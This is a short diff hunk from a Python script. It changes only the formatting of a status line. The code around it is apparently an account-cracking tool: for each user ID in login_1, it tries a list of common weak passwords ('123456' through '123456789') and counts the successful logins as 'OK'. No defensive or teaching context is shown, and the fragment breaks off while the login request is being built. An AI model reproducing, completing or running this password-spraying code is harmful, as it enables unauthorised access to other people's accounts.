@@ -425,7 +425,8 @@ def login_1(uid):
         sys.stdout.write(
             f"\r\r\{U}🌏PRDS🧬"
             f"{b}~{WH}{loop}{b}~"
-            f"{b}~{WH}OK {len(oks)}{b}~")
+            f"{b}~{WH}OK {len(oks)}{b}~"
+        )
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
